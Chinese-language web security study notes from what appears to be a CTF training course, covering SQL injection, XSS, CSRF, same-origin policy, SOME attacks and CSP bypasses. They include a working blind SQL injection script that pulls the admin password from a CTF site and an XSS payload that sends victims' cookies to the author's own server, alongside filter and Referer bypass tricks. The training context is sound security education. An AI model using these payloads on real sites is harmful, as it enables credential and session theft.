# day6

## sql注入

*   sql盲注脚本

    ```python
    import requests
    import re
    import sys
    p = re.compile(r'''ID: (.+?)&nbspx:''')
    ans = ''
    for pos in range(1,33):
        l = 0
        r = 127
        cookies = {"PHPSESSID":"tf7511brt2272n9ne5i8dj6o35"}
        data = {"x": "1", "y": "1"}
        while l<r:
            mid = int((l+r)/2)
            resp = requests.post(
                "https://web.ctflearn.com/grid/controller.php?action=add_point", data=data, cookies=cookies).text
            resp = requests.get("https://web.ctflearn.com/grid/", cookies=cookies).text
            _id = p.search(resp).group(1)
            payload = _id +  ' and ord(mid((select password from user where username="admin" limit 0, 1), ' +  str(pos) + ',1))>' + str(mid)
            length = len(payload)
            resp = requests.get('''https://web.ctflearn.com/grid/controller.php?action=delete_point&point=O:5:"point":3:{s:1:"x";s:1:"1";s:1:"y";s:1:"1";s:2:"ID";s:'''+str(length)+''':"%s";}'''%payload,cookies=cookies,allow_redirects=False).text
            resp = requests.get("http://web.ctflearn.com/grid/",cookies=cookies).text
            if _id not in resp:
                l = mid+1
            else:
                r = mid
        if l==0:
            break
        ans = ans + chr(l)
        print(ans)
    ```

## XSS攻击与防御

### Cookie

* 获取cookie的方法：浏览器端（客户端） → document.cookie；服务器端（PHP） → $\_COOKIE\[]
* PS：服务器端的一个响应包中只能包含一个set-cookie
* Chrome的Windows Cookie的位置：AppData\Local...
* Cookie属性 → 分号分隔的键值对
  * domain只可以设置为页面本身或其子页面、不能设置为顶级域名

### XSS漏洞

* 简介：攻击者可以在页面上插入html代码，通过javaScript得到受害者信息。分类：
  1. 反射性：用户请求的中的参数直接输出到了页面中，形成XSS
  2. 存储性（评论功能）：将用户提交的评论存储在数据库的表中 → 从数据库中取出来直接显示在评论区中
  3. _DOM性_：页面中的源码中并无XSS攻击向量
* 危害：窃取信息、XSS蠕虫、命令执行
  * 命令执行：特权域XSS → WooYun-2016-170984；沙盒绕过 → CVE-2017-12581
* 编码：
  * HTML实体编码：符号的功能性编码与显示编码分离 → DOM元素的属性值会自动解码HTML编码
  * URL编码：后端需要进行一个decode
  * 页面编码：利用gbk编码漏洞 → 转移符`\`在gbk中的低字节位，如果在前面插入一个单字节高位字节，组合成一个合法字符，可以用于逃逸`\`
* XSS漏洞注入点
* XSS注入的一些小trick：
  1. 过滤`"."`，使用with语句；过滤`';'`，用换行
  2. url协议头可以去掉，如//example.com(http)
  3. HTML实体编码中，`';'`可以去掉
  4. 可以利用拼接eval函数执行代码，例如：`"a"+eval("alert(1)")`
* _hidden元素XSS_

### CTF中的XSS题目

* 绕过（例子：HCTF2016 guestbook）
*   课上习题2：

    * 爆破md5：

    ```php
    <?php
        $i = 0;
        while(1){
            if(substr(md5($i),0,6) === '966150')
                break;
            $$i = $$i +1;
        }
        echo $i;
    ?>
    ```

    * Payload：

    ```markup
    <script>
        with(document){
            location=`//760096541/`+escape(cookie)
        }
    </script>
    ```

    * 过滤了字符 `.` 使用 `with(){}` 指定作用域，地址转化为十进制（该十进制为指定的自己的服务器，在自己的服务器上可以得到cookie参数）

### XSS防御

* Chrome XSS Filter
* 过滤（不安全）
* 转义和编码 → 较安全的方法：编码（转成实体编码）
* HttpOnly → 后端代码中可以将Cookie添加一个给HttpOnly属性，这样就不会被前端的JS读取到

## CSRF攻击与防御

* CSRF: Cross-Site Request Forgery

### CSRF攻击

* 攻击分类：GET型、POST型、伪造请求、JSON
  * 307跳转：307跳转可以不改变请求主体，只改变请求目标。现在自己的服务器上放置一个main.html，包含产生307的flash，在统计
* CSRF绕过：
  * 空Referer → get请求、data协议、https向http跳转
  * Referer前缀绕过。比如检测前缀`https://www.qq.com`，可以自己注册域名`https://www.qq.comxx.xx`

### CSRF防御

* 方式：验证码、添加token、Referer

## 同源分析

* 源：协议 + 域名 + 端口

### 跨域方式

* Ajax：可以发送请求，但是不能带cookie
* CORS → 跨域资源共享
* windows.name可以跨域
* Jsonp → 可以实现从其他网站获取数据。数据包中的content是可控的。
  * a页面希望或许b页面的数据 → a向b发送一个jsonp请求 → 调用a页面中定义的CallBack函数

### jsonp攻击方式 → SOME攻击

SOME攻击：用户访问a.com可以实现在b.com上执行javascript

* [http://b.com/index.html](http://b.com/index.html)

```markup
<form>
    <button onclick="c()">Secret Button</button>
</form>
<script>
    function c() {alert("click!");}
</script>
```

* [http://b.com/jsonp.php](http://b.com/jsonp.php)

```php
<?php
    ?>
```

* [http://a.com/some1.html](http://a.com/some1.html)
* [http://a.com/some2.html](http://a.com/some2.html)

```markup
```

### CSP → content-src-policy

CSP绕过：

* url跳转：在default-src为'none'的情况下，可以使用meta标签实现跳转
* 标签预加载：CSP对link标签的预加载考虑不完善
* 利用浏览器补全
* 代码重用 → Blackhat2017上有篇ppt总结了可以被用来绕过CSP的一些JS库
* iframe → 如果同源的其他页面内没有CSP限制，则可以利用没有限制的页面实现绕过CSP
* meta标签 → meta可以控制缓存（在header没有设置的情况下），有时可以用来绕过CSP nonce
